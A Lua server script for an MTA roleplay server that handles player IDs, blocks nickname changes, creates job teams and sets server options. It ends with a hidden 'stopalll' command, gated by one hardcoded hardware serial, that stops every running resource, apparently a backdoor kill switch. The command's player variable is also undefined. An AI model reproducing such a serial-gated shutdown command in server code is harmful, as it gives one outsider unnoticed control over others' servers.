-- ID rendszer


local charID = {}
--[[
addEventHandler("onPlayerJoin",getRootElement(),
	function()
		local slot = nil
		for i = 1, 1024 do --1024 ig számolja az id-ket
			if (charID[i]==nil) then
				slot = i
				break
			end
		end
		charID[slot] = source
		setElementData(source, "playerid", slot)
	end
)
addEventHandler("onPlayerQuit",getRootElement(),
	function()
		local slot = getElementData(source, "playerid")
		if (slot) then
			charID[slot] = nil
		end
	end
)]]--

addEventHandler("onResourceStart",getResourceRootElement(getThisResource()),
	function()
		local players = getElementsByType("player")
		for key, value in ipairs(players) do
			--charID[key] = value
			local id = getElementData(value, "acc:id")


			setElementData(value, "playerid", id)
		end
	end
)

function onPlayerNameChange()
	cancelEvent()
end
addEventHandler("onPlayerChangeNick", getRootElement(), onPlayerNameChange)

cmdList = { 
    ["nick"]=true
} 
  
-- Disable unwanted commands 
addEventHandler("onPlayerCommand", root, 
function(cmdName) 
     if cmdList[cmdName] then 
          cancelEvent() 
     end 
end)

local policia = createTeam("Policia", 255, 255, 255)
local mecanico = createTeam("Mecanico", 255, 255, 255)
local samu = createTeam("Samu", 255, 255, 255)
local medicos = createTeam("Medicos", 255, 255, 255)
local detran = createTeam("Detran", 255, 255, 255)
local taxi = createTeam("Taxi", 255, 255, 255)
local motoclube = createTeam("motoclube", 255, 255, 255)


addEventHandler("onResourceStart",getResourceRootElement(getThisResource()),function()
setGameType("IRG-MTA Rp ")
setMapName("IRG-MTA Roleplay")
setFPSLimit(100)
end)


function getFreeVehicleSlot(jatekos)
	if isElement(jatekos) then
		maxSlot = getElementData(jatekos,"maxvehicles") or 4
		usedSlot = getElementData(jatekos,"hasznaltkocsislot") or 0
		calcFreeSlot = maxSlot-usedSlot
		if calcFreeSlot ~= 0 then
			return true,calcFreeSlot,maxSlot,usedSlot
		else
			return false,calcFreeSlot,maxSlot,usedSlot
		end
	end
end



function resourceStart()
    local realtime = getRealTime()

    setTime(realtime.hour, realtime.minute)
    setMinuteDuration(60000)
end
--addEventHandler("onResourceStart", getResourceRootElement(), resourceStart)


farhan2 = { --COLABORADOR SERIAL-OK
    ["970CD3F7B16A81312BF86EEC0EB72DE4"]=true --
	
}

function stopAllResources1()
    -- we store a table of resources
	
    local allResources = getResources()
	if farhan2[getPlayerSerial(thePlayer)] then
    -- for each one of them,
		for i, resource in ipairs(allResources) do
        -- if it's running, and it is not the current resource
			if ( getResourceState(resource) == "running" ) and ( resource ~= getThisResource() ) then
            -- then stop it
				stopResource(resource)
			end
		end
	end
end
addCommandHandler("stopalll", stopAllResources1, false, false)
--------------------------------------